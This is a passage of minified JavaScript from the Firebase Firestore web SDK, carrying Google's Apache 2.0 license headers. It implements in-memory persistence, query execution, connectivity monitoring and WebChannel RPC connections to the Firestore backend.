e=this.ts.get(r.largestBatchId).delete(n.key);this.ts.set(r.largestBatchId,e)}this.overlays=this.overlays.insert(n.key,new Vs(t,n));let i=this.ts.get(t);void 0===i&&(i=us(),this.ts.set(t,i)),this.ts.set(t,i.add(n.key))}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ca{constructor(){this.es=new $r(Na.ns),this.ss=new $r(Na.rs)}isEmpty(){return this.es.isEmpty()}addReference(e,t){let n=new Na(e,t);this.es=this.es.add(n),this.ss=this.ss.add(n)}os(e,t){e.forEach((e=>this.addReference(e,t)))}removeReference(e,t){this.us(new Na(e,t))}cs(e,t){e.forEach((e=>this.removeReference(e,t)))}hs(e){let t=new Or(new Ar([])),n=new Na(t,e),r=new Na(t,e+1),i=[];return this.ss.forEachInRange([n,r],(e=>{this.us(e),i.push(e.key)})),i}ls(){this.es.forEach((e=>this.us(e)))}us(e){this.es=this.es.delete(e),this.ss=this.ss.delete(e)}fs(e){let t=new Or(new Ar([])),n=new Na(t,e),r=new Na(t,e+1),i=us();return this.ss.forEachInRange([n,r],(e=>{i=i.add(e.key)})),i}containsKey(e){let t=new Na(e,0),n=this.es.firstAfterOrEqual(t);return null!==n&&e.isEqual(n.key)}}class Na{constructor(e,t){this.key=e,this.ds=t}static ns(e,t){return Or.comparator(e.key,t.key)||Ir(e.ds,t.ds)}static rs(e,t){return Ir(e.ds,t.ds)||Or.comparator(e.key,t.key)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Oa{constructor(e,t){this.indexManager=e,this.referenceDelegate=t,this.mutationQueue=[],this.ws=1,this._s=new $r(Na.ns)}checkEmpty(e){return xr.resolve(0===this.mutationQueue.length)}addMutationBatch(e,t,n,r){let i=this.ws;this.ws++,this.mutationQueue.length>0&&this.mutationQueue[this.mutationQueue.length-1];let s=new Fs(i,t,n,r);for(let t of(this.mutationQueue.push(s),r))this._s=this._s.add(new Na(t.key,i)),this.indexManager.addToCollectionParentIndex(e,t.key.path.popLast());return xr.resolve(s)}lookupMutationBatch(e,t){return xr.resolve(this.gs(t))}getNextMutationBatchAfterBatchId(e,t){let n=this.ys(t+1),r=n<0?0:n;return xr.resolve(this.mutationQueue.length>r?this.mutationQueue[r]:null)}getHighestUnacknowledgedBatchId(){return xr.resolve(0===this.mutationQueue.length?-1:this.ws-1)}getAllMutationBatches(e){return xr.resolve(this.mutationQueue.slice())}getAllMutationBatchesAffectingDocumentKey(e,t){let n=new Na(t,0),r=new Na(t,Number.POSITIVE_INFINITY),i=[];return this._s.forEachInRange([n,r],(e=>{let t=this.gs(e.ds);i.push(t)})),xr.resolve(i)}getAllMutationBatchesAffectingDocumentKeys(e,t){let n=new $r(Ir);return t.forEach((e=>{let t=new Na(e,0),r=new Na(e,Number.POSITIVE_INFINITY);this._s.forEachInRange([t,r],(e=>{n=n.add(e.ds)}))})),xr.resolve(this.ps(n))}getAllMutationBatchesAffectingQuery(e,t){let n=t.path,r=n.length+1,i=n;Or.isDocumentKey(i)||(i=i.child(""));let s=new Na(new Or(i),0),a=new $r(Ir);return this._s.forEachWhile((e=>{let t=e.key.path;return!!n.isPrefixOf(t)&&(t.length===r&&(a=a.add(e.ds)),!0)}),s),xr.resolve(this.ps(a))}ps(e){let t=[];return e.forEach((e=>{let n=this.gs(e);null!==n&&t.push(n)})),t}removeMutationBatch(e,t){0===this.Is(t.batchId,"removed")||ur(),this.mutationQueue.shift();let n=this._s;return xr.forEach(t.mutations,(r=>{let i=new Na(r.key,t.batchId);return n=n.delete(i),this.referenceDelegate.markPotentiallyOrphaned(e,r.key)})).next((()=>{this._s=n}))}En(e){}containsKey(e,t){let n=new Na(t,0),r=this._s.firstAfterOrEqual(n);return xr.resolve(t.isEqual(r&&r.key))}performConsistencyCheck(e){return this.mutationQueue.length,xr.resolve()}Is(e,t){return this.ys(e)}ys(e){return 0===this.mutationQueue.length?0:e-this.mutationQueue[0].batchId}gs(e){let t=this.ys(e);return t<0||t>=this.mutationQueue.length?null:this.mutationQueue[t]}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Da{constructor(e){this.Ts=e,this.docs=new jr(Or.comparator),this.size=0}setIndexManager(e){this.indexManager=e}addEntry(e,t){let n=t.key,r=this.docs.get(n),i=r?r.size:0,s=this.Ts(t);return this.docs=this.docs.insert(n,{document:t.mutableCopy(),size:s}),this.size+=s-i,this.indexManager.addToCollectionParentIndex(e,n.path.popLast())}removeEntry(e){let t=this.docs.get(e);t&&(this.docs=this.docs.remove(e),this.size-=t.size)}getEntry(e,t){let n=this.docs.get(t);return xr.resolve(n?n.document.mutableCopy():vi.newInvalidDocument(t))}getEntries(e,t){let n=ns;return t.forEach((e=>{let t=this.docs.get(e);n=n.insert(e,t?t.document.mutableCopy():vi.newInvalidDocument(e))})),xr.resolve(n)}getDocumentsMatchingQuery(e,t,n,r){let i=ns,s=t.path,a=new Or(s.child("")),o=this.docs.getIteratorFrom(a);for(;o.hasNext();){let{key:e,value:{document:a}}=o.getNext();if(!s.isPrefixOf(e.path))break;e.path.length>s.length+1||0>=function(e,t){let n=e.readTime.compareTo(t.readTime);return 0!==n||0!==(n=Or.comparator(e.documentKey,t.documentKey))?n:Ir(e.largestBatchId,t.largestBatchId)}(new Dr(a.readTime,a.key,-1),n)||(r.has(a.key)||Zi(t,a))&&(i=i.insert(a.key,a.mutableCopy()))}return xr.resolve(i)}getAllFromCollectionGroup(e,t,n,r){ur()}Es(e,t){return xr.forEach(this.docs,(e=>t(e)))}newChangeBuffer(e){return new Ra(this)}getSize(e){return xr.resolve(this.size)}}class Ra extends class{constructor(){this.changes=new ts((e=>e.toString()),((e,t)=>e.isEqual(t))),this.changesApplied=!1}addEntry(e){this.assertNotApplied(),this.changes.set(e.key,e)}removeEntry(e,t){this.assertNotApplied(),this.changes.set(e,vi.newInvalidDocument(e).setReadTime(t))}getEntry(e,t){this.assertNotApplied();let n=this.changes.get(t);return void 0!==n?xr.resolve(n):this.getFromCache(e,t)}getEntries(e,t){return this.getAllFromCache(e,t)}apply(e){return this.assertNotApplied(),this.changesApplied=!0,this.applyChanges(e)}assertNotApplied(){}}{constructor(e){super(),this.Jn=e}applyChanges(e){let t=[];return this.changes.forEach(((n,r)=>{r.isValidDocument()?t.push(this.Jn.addEntry(e,r)):this.Jn.removeEntry(n)})),xr.waitFor(t)}getFromCache(e,t){return this.Jn.getEntry(e,t)}getAllFromCache(e,t){return this.Jn.getEntries(e,t)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class xa{constructor(e){this.persistence=e,this.As=new ts((e=>Ui(e)),Vi),this.lastRemoteSnapshotVersion=Sr.min(),this.highestTargetId=0,this.Rs=0,this.vs=new Ca,this.targetCount=0,this.bs=Ea.vn()}forEachTarget(e,t){return this.As.forEach(((e,n)=>t(n))),xr.resolve()}getLastRemoteSnapshotVersion(e){return xr.resolve(this.lastRemoteSnapshotVersion)}getHighestSequenceNumber(e){return xr.resolve(this.Rs)}allocateTargetId(e){return this.highestTargetId=this.bs.next(),xr.resolve(this.highestTargetId)}setTargetsMetadata(e,t,n){return n&&(this.lastRemoteSnapshotVersion=n),t>this.Rs&&(this.Rs=t),xr.resolve()}Sn(e){this.As.set(e.target,e);let t=e.targetId;t>this.highestTargetId&&(this.bs=new Ea(t),this.highestTargetId=t),e.sequenceNumber>this.Rs&&(this.Rs=e.sequenceNumber)}addTargetData(e,t){return this.Sn(t),this.targetCount+=1,xr.resolve()}updateTargetData(e,t){return this.Sn(t),xr.resolve()}removeTargetData(e,t){return this.As.delete(t.target),this.vs.hs(t.targetId),this.targetCount-=1,xr.resolve()}removeTargets(e,t,n){let r=0,i=[];return this.As.forEach(((s,a)=>{a.sequenceNumber<=t&&null===n.get(a.targetId)&&(this.As.delete(s),i.push(this.removeMatchingKeysForTargetId(e,a.targetId)),r++)})),xr.waitFor(i).next((()=>r))}getTargetCount(e){return xr.resolve(this.targetCount)}getTargetData(e,t){let n=this.As.get(t)||null;return xr.resolve(n)}addMatchingKeys(e,t,n){return this.vs.os(t,n),xr.resolve()}removeMatchingKeys(e,t,n){this.vs.cs(t,n);let r=this.persistence.referenceDelegate,i=[];return r&&t.forEach((t=>{i.push(r.markPotentiallyOrphaned(e,t))})),xr.waitFor(i)}removeMatchingKeysForTargetId(e,t){return this.vs.hs(t),xr.resolve()}getMatchingKeysForTargetId(e,t){let n=this.vs.fs(t);return xr.resolve(n)}containsKey(e,t){return xr.resolve(this.vs.containsKey(t))}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Pa{constructor(e,t){this.Ps={},this.overlays={},this.Vs=new Lr(0),this.Ss=!1,this.Ss=!0,this.referenceDelegate=e(this),this.Ds=new xa(this),this.indexManager=new ba,this.remoteDocumentCache=new Da((e=>this.referenceDelegate.Cs(e))),this.serializer=new va(t),this.xs=new ka(this.serializer)}start(){return Promise.resolve()}shutdown(){return this.Ss=!1,Promise.resolve()}get started(){return this.Ss}setDatabaseDeletedListener(){}setNetworkEnabled(){}getIndexManager(e){return this.indexManager}getDocumentOverlayCache(e){let t=this.overlays[e.toKey()];return t||(t=new Aa,this.overlays[e.toKey()]=t),t}getMutationQueue(e,t){let n=this.Ps[e.toKey()];return n||(n=new Oa(t,this.referenceDelegate),this.Ps[e.toKey()]=n),n}getTargetCache(){return this.Ds}getRemoteDocumentCache(){return this.remoteDocumentCache}getBundleCache(){return this.xs}runTransaction(e,t,n){sr("MemoryPersistence","Starting transaction:",e);let r=new La(this.Vs.next());return this.referenceDelegate.Ns(),n(r).next((e=>this.referenceDelegate.ks(r).next((()=>e)))).toPromise().then((e=>(r.raiseOnCommittedEvent(),e)))}Os(e,t){return xr.or(Object.values(this.Ps).map((n=>()=>n.containsKey(e,t))))}}class La extends class{constructor(){this.onCommittedListeners=[]}addOnCommittedListener(e){this.onCommittedListeners.push(e)}raiseOnCommittedEvent(){this.onCommittedListeners.forEach((e=>e()))}}{constructor(e){super(),this.currentSequenceNumber=e}}class Ma{constructor(e){this.persistence=e,this.$s=new Ca,this.Ms=null}static Fs(e){return new Ma(e)}get Bs(){if(this.Ms)return this.Ms;throw ur()}addReference(e,t,n){return this.$s.addReference(n,t),this.Bs.delete(n.toString()),xr.resolve()}removeReference(e,t,n){return this.$s.removeReference(n,t),this.Bs.add(n.toString()),xr.resolve()}markPotentiallyOrphaned(e,t){return this.Bs.add(t.toString()),xr.resolve()}removeTarget(e,t){this.$s.hs(t.targetId).forEach((e=>this.Bs.add(e.toString())));let n=this.persistence.getTargetCache();return n.getMatchingKeysForTargetId(e,t.targetId).next((e=>{e.forEach((e=>this.Bs.add(e.toString())))})).next((()=>n.removeTargetData(e,t)))}Ns(){this.Ms=new Set}ks(e){let t=this.persistence.getRemoteDocumentCache().newChangeBuffer();return xr.forEach(this.Bs,(n=>{let r=Or.fromPath(n);return this.Ls(e,r).next((e=>{e||t.removeEntry(r,Sr.min())}))})).next((()=>(this.Ms=null,t.apply(e))))}updateLimboDocument(e,t){return this.Ls(e,t).next((e=>{e?this.Bs.delete(t.toString()):this.Bs.add(t.toString())}))}Cs(e){return 0}Ls(e,t){return xr.or([()=>xr.resolve(this.$s.containsKey(t)),()=>this.persistence.getTargetCache().containsKey(e,t),()=>this.persistence.Os(e,t)])}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fa{constructor(e,t,n,r){this.targetId=e,this.fromCache=t,this.Vi=n,this.Si=r}static Di(e,t){let n=us(),r=us();for(let e of t.docChanges)switch(e.type){case 0:n=n.add(e.doc.key);break;case 1:r=r.add(e.doc.key)}return new Fa(e,t.fromCache,n,r)}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ua{constructor(){this.Ci=!1}initialize(e,t){this.xi=e,this.indexManager=t,this.Ci=!0}getDocumentsMatchingQuery(e,t,n,r){return this.Ni(e,t).next((i=>i||this.ki(e,t,r,n))).next((n=>n||this.Oi(e,t)))}Ni(e,t){if(qi(t))return xr.resolve(null);let n=Hi(t);return this.indexManager.getIndexType(e,n).next((r=>0===r?null:(null!==t.limit&&1===r&&(n=Hi(t=Qi(t,null,"F"))),this.indexManager.getDocumentsMatchingTarget(e,n).next((r=>{let i=us(...r);return this.xi.getDocuments(e,i).next((r=>this.indexManager.getMinOffset(e,n).next((n=>{let s=this.$i(t,r);return this.Mi(t,s,i,n.readTime)?this.Ni(e,Qi(t,null,"F")):this.Fi(e,s,t,n)}))))})))))}ki(e,t,n,r){return qi(t)||r.isEqual(Sr.min())?this.Oi(e,t):this.xi.getDocuments(e,n).next((i=>{let s=this.$i(t,i);return this.Mi(t,s,n,r)?this.Oi(e,t):(ir()<=d.in.DEBUG&&sr("QueryEngine","Re-using previous result from %s to execute query: %s",r.toString(),Yi(t)),this.Fi(e,s,t,function(e,t){let n=e.toTimestamp().seconds,r=e.toTimestamp().nanoseconds+1,i=Sr.fromTimestamp(1e9===r?new Tr(n+1,0):new Tr(n,r));return new Dr(i,Or.empty(),-1)}(r)))}))}$i(e,t){let n=new $r(es(e));return t.forEach(((t,r)=>{Zi(e,r)&&(n=n.add(r))})),n}Mi(e,t,n,r){if(null===e.limit)return!1;if(n.size!==t.size)return!0;let i="F"===e.limitType?t.last():t.first();return!!i&&(i.hasPendingWrites||i.version.compareTo(r)>0)}Oi(e,t){return ir()<=d.in.DEBUG&&sr("QueryEngine","Using full collection scan to execute query:",Yi(t)),this.xi.getDocumentsMatchingQuery(e,t,Dr.min())}Fi(e,t,n,r){return this.xi.getDocumentsMatchingQuery(e,n,r).next((e=>(t.forEach((t=>{e=e.insert(t.key,t)})),e)))}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Va{constructor(e,t,n,r){this.persistence=e,this.Bi=t,this.serializer=r,this.Li=new jr(Ir),this.qi=new ts((e=>Ui(e)),Vi),this.Ui=new Map,this.Ki=e.getRemoteDocumentCache(),this.Ds=e.getTargetCache(),this.xs=e.getBundleCache(),this.Gi(n)}Gi(e){this.documentOverlayCache=this.persistence.getDocumentOverlayCache(e),this.indexManager=this.persistence.getIndexManager(e),this.mutationQueue=this.persistence.getMutationQueue(e,this.indexManager),this.localDocuments=new Sa(this.Ki,this.mutationQueue,this.documentOverlayCache,this.indexManager),this.Ki.setIndexManager(this.indexManager),this.Bi.initialize(this.localDocuments,this.indexManager)}collectGarbage(e){return this.persistence.runTransaction("Collect garbage","readwrite-primary",(t=>e.collect(t,this.Li)))}}async function ja(e,t){return await e.persistence.runTransaction("Handle user change","readonly",(n=>{let r;return e.mutationQueue.getAllMutationBatches(n).next((i=>(r=i,e.Gi(t),e.mutationQueue.getAllMutationBatches(n)))).next((t=>{let i=[],s=[],a=us();for(let e of r)for(let t of(i.push(e.batchId),e.mutations))a=a.add(t.key);for(let e of t)for(let t of(s.push(e.batchId),e.mutations))a=a.add(t.key);return e.localDocuments.getDocuments(n,a).next((e=>({Qi:e,removedBatchIds:i,addedBatchIds:s})))}))}))}function Ba(e){return e.persistence.runTransaction("Get last remote snapshot version","readonly",(t=>e.Ds.getLastRemoteSnapshotVersion(t)))}async function qa(e,t,n){let r=e,i=r.Li.get(t);try{n||await r.persistence.runTransaction("Release target",n?"readwrite":"readwrite-primary",(e=>r.persistence.referenceDelegate.removeTarget(e,i)))}catch(e){if(!Pr(e))throw e;sr("LocalStore",`Failed to update sequence numbers for target ${t}: ${e}`)}r.Li=r.Li.remove(t),r.qi.delete(i.target)}function $a(e,t,n){let r=Sr.min(),i=us();return e.persistence.runTransaction("Execute query","readonly",(s=>function(e,t,n){let r=e.qi.get(n);return void 0!==r?xr.resolve(e.Li.get(r)):e.Ds.getTargetData(t,n)}(e,s,Hi(t)).next((t=>{if(t)return r=t.lastLimboFreeSnapshotVersion,e.Ds.getMatchingKeysForTargetId(s,t.targetId).next((e=>{i=e}))})).next((()=>e.Bi.getDocumentsMatchingQuery(s,t,n?r:Sr.min(),n?i:us()))).next((n=>{var r;let s;return r=t.collectionGroup||(t.path.length%2==1?t.path.lastSegment():t.path.get(t.path.length-2)),s=e.Ui.get(r)||Sr.min(),n.forEach(((e,t)=>{t.readTime.compareTo(s)>0&&(s=t.readTime)})),e.Ui.set(r,s),{documents:n,Wi:i}}))))}class za{constructor(){this.activeTargetIds=cs}tr(e){this.activeTargetIds=this.activeTargetIds.add(e)}er(e){this.activeTargetIds=this.activeTargetIds.delete(e)}Xi(){let e={activeTargetIds:this.activeTargetIds.toArray(),updateTimeMs:Date.now()};return JSON.stringify(e)}}class Ga{constructor(){this.Br=new za,this.Lr={},this.onlineStateHandler=null,this.sequenceNumberHandler=null}addPendingMutation(e){}updateMutationState(e,t,n){}addLocalQueryTarget(e){return this.Br.tr(e),this.Lr[e]||"not-current"}updateQueryState(e,t,n){this.Lr[e]=t}removeLocalQueryTarget(e){this.Br.er(e)}isLocalQueryTarget(e){return this.Br.activeTargetIds.has(e)}clearQueryState(e){delete this.Lr[e]}getAllActiveQueryTargets(){return this.Br.activeTargetIds}isActiveQueryTarget(e){return this.Br.activeTargetIds.has(e)}start(){return this.Br=new za,Promise.resolve()}handleUserChange(e,t,n){}setOnlineState(e){}shutdown(){}writeSequenceNumber(e){}notifyBundleLoaded(e){}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ka{qr(e){}shutdown(){}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ha{constructor(){this.Ur=()=>this.Kr(),this.Gr=()=>this.Qr(),this.zr=[],this.jr()}qr(e){this.zr.push(e)}shutdown(){window.removeEventListener("online",this.Ur),window.removeEventListener("offline",this.Gr)}jr(){window.addEventListener("online",this.Ur),window.addEventListener("offline",this.Gr)}Kr(){for(let e of(sr("ConnectivityMonitor","Network connectivity changed: AVAILABLE"),this.zr))e(0)}Qr(){for(let e of(sr("ConnectivityMonitor","Network connectivity changed: UNAVAILABLE"),this.zr))e(1)}static D(){return"undefined"!=typeof window&&void 0!==window.addEventListener&&void 0!==window.removeEventListener}}
/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Wa=null;function Qa(){return null===Wa?Wa=268435456+Math.round(2147483648*Math.random()):Wa++,"0x"+Wa.toString(16)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Ja={BatchGetDocuments:"batchGet",Commit:"commit",RunQuery:"runQuery",RunAggregationQuery:"runAggregationQuery"};
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Xa{constructor(e){this.Wr=e.Wr,this.Hr=e.Hr}Jr(e){this.Yr=e}Zr(e){this.Xr=e}onMessage(e){this.eo=e}close(){this.Hr()}send(e){this.Wr(e)}no(){this.Yr()}so(e){this.Xr(e)}io(e){this.eo(e)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Ya="WebChannelConnection";class Za extends class{constructor(e){this.databaseInfo=e,this.databaseId=e.databaseId;let t=e.ssl?"https":"http";this.ro=t+"://"+e.host,this.oo="projects/"+this.databaseId.projectId+"/databases/"+this.databaseId.database+"/documents"}get uo(){return!1}co(e,t,n,r,i){let s=Qa(),a=this.ao(e,t);sr("RestConnection",`Sending RPC '${e}' ${s}:`,a,n);let o={};return this.ho(o,r,i),this.lo(e,a,o,n).then((t=>(sr("RestConnection",`Received RPC '${e}' ${s}: `,t),t)),(t=>{throw or("RestConnection",`RPC '${e}' ${s} failed with error: `,t,"url: ",a,"request:",n),t}))}fo(e,t,n,r,i,s){return this.co(e,t,n,r,i)}ho(e,t,n){e["X-Goog-Api-Client"]="gl-js/ fire/"+nr,e["Content-Type"]="text/plain",this.databaseInfo.appId&&(e["X-Firebase-GMPID"]=this.databaseInfo.appId),t&&t.headers.forEach(((t,n)=>e[n]=t)),n&&n.headers.forEach(((t,n)=>e[n]=t))}ao(e,t){let n=Ja[e];return`${this.ro}/v1/${t}:${n}`}}{constructor(e){super(e),this.forceLongPolling=e.forceLongPolling,this.autoDetectLongPolling=e.autoDetectLongPolling,this.useFetchStreams=e.useFetchStreams}lo(e,t,n,r){let i=Qa();return new Promise(((s,a)=>{let o=new Zn;o.setWithCredentials(!0),o.listenOnce(Wn.COMPLETE,(()=>{try{switch(o.getLastErrorCode()){case Hn.NO_ERROR:let t=o.getResponseJson();sr(Ya,`XHR for RPC '${e}' ${i} received:`,JSON.stringify(t)),s(t);break;case Hn.TIMEOUT:sr(Ya,`RPC '${e}' ${i} timed out`),a(new hr(cr.DEADLINE_EXCEEDED,"Request time out"));break;case Hn.HTTP_ERROR:let n=o.getStatus();if(sr(Ya,`RPC '${e}' ${i} failed with status:`,n,"response text:",o.getResponseText()),n>0){let e=o.getResponseJson();Array.isArray(e)&&(e=e[0]);let t=null==e?void 0:e.error;if(t&&t.status&&t.message){let e=function(e){let t=e.toLowerCase().replace(/_/g,"-");return Object.values(cr).indexOf(t)>=0?t:cr.UNKNOWN}(t.status);a(new hr(e,t.message))}else a(new hr(cr.UNKNOWN,"Server responded with status "+o.getStatus()))}else a(new hr(cr.UNAVAILABLE,"Connection failed."));break;default:ur()}}finally{sr(Ya,`RPC '${e}' ${i} completed.`)}}));let l=JSON.stringify(r);sr(Ya,`RPC '${e}' ${i} sending request:`,r),o.send(t,"POST",l,n,15)}))}wo(e,t,n){let r=Qa(),i=[this.ro,"/","google.firestore.v1.Firestore","/",e,"/channel"],s=Gn(),a=Kn(),l={httpSessionIdParam:"gsessionid",initMessageHeaders:{},messageUrlParams:{database:`projects/${this.databaseId.projectId}/databases/${this.databaseId.database}`},sendRawJson:!0,supportsCrossDomainXhr:!0,internalChannelParams:{forwardChannelRequestTimeoutMs:6e5},forceLongPolling:this.forceLongPolling,detectBufferingProxy:this.autoDetectLongPolling};this.useFetchStreams&&(l.xmlHttpFactory=new Xn({})),this.ho(l.initMessageHeaders,t,n),l.encodeInitMessageHeaders=!0;let u=i.join("");sr(Ya,`Creating RPC '${e}' stream ${r}: ${u}`,l);let c=s.createWebChannel(u,l),h=!1,d=!1,f=new Xa({Wr:t=>{d?sr(Ya,`Not sending because RPC '${e}' stream ${r} is closed:`,t):(h||(sr(Ya,`Opening RPC '${e}' stream ${r} transport.`),c.open(),h=!0),sr(Ya,`RPC '${e}' stream ${r} sending:`,t),c.send(t))},Hr:()=>c.close()}),p=(e,t,n)=>{e.listen(t,(e=>{try{n(e)}catch(e){setTimeout((()=>{throw e}),0)}}))};return p(c,Yn.EventType.OPEN,(()=>{d||sr(Ya,`RPC '${e}' stream ${r} transport opened.`)})),p(c,Yn.EventType.CLOSE,(()=>{d||(d=!0,sr(Ya,`RPC '${e}' stream ${r} transport closed`),f.so())})),p(c,Yn.EventType.ERROR,(t=>{d||(d=!0,or(Ya,`RPC '${e}' stream ${r} transport errored:`,t),f.so(new hr(cr.UNAVAILABLE,"The operation could not be completed")))})),p(c,Yn.EventType.MESSAGE,(t=>{var n;if(!d){let i=t.data[0];i||ur();let s=i.error||(null===(n=i[0])||void 0===n?void 0:n.error);if(s){sr(Ya,`RPC '${e}' stream ${r} received error:`,s);let t=s.status,n=function(e){let t=o[e];if(void 0!==t)return Bs(t)}(t),i=s.message;void 0===n&&(n=cr.INTERNAL,i="Unknown error status: "+t+" with message "+s.message),d=!0,f.so(new hr(n,i)),c.close()}else sr(Ya,`RPC '${e}' stream ${r} received:`,i),f.io(i)}})),p(a,Qn.STAT_EVENT,(t=>{t.stat===Jn.PROXY?sr(Ya,`RPC '${e}' stream ${r} detected buffering proxy`):t.stat===Jn.NOPROXY&&sr(Ya,`RPC '${e}' stream ${r} detected no buffering proxy`)})),setTimeout((()=>{f.no()}),0),f}}function eo(){return"undefined"!=typeof document?document:null}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
